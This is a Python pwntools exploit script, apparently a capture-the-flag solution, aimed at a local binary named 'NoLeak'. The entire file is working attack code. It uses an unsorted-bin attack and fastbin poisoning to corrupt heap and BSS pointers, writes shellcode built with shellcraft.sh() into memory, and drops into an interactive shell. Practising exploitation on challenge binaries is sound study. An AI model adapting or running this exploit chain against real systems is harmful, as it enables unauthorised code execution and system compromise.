from pwn import *
import sys

if len(sys.argv) < 2:
	debug = True
else:
	debug = False

if debug:
	p = process("./NoLeak")
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
	elf = ELF("./NoLeak")
else:
	pass

def add(size,content):
	p.sendafter("Your choice :","1")
	p.sendafter("Size: ",str(size))
	p.sendafter("Data: ",content)

def free(index):
	p.sendafter("Your choice :","2")
	p.sendafter("Index: ",str(index))

def edit(index,content):
	p.sendafter("Your choice :","3")
	p.sendafter("Index: ",str(index))
	p.sendafter("Size: ",str(len(content)))
	p.sendafter("Data: ",content)

def debugf():
	gdb.attach(p,"b *0x4009B1")

context.log_level = "debug"
context.terminal = ["tmux","splitw","-h"]
context.bits = "64"
context.arch = "amd64"
debugf()
add(0x100,"a") #0
add(0x60,"b") #1
free(0)
bss_base = 0x601040
target = 0x601040 + 0x18 + 0x10
payload = p64(0) + p64(target - 0x10)
edit(0,payload)
add(0x100,"c") #2 3
fast_target = target - 3
free(1)
payload = p64(fast_target)
edit(1,payload)
add(0x60,"d")
payload = "eee" + p64(bss_base + 0x28)
add(0x60,payload)
edit(7,"\x10")
sc = asm(shellcraft.sh())
edit(5,p64(bss_base + 0x28))
edit(7,sc)
p.sendafter("Your choice :","1")
p.sendafter("Size: ",str(0x10))
p.interactive()
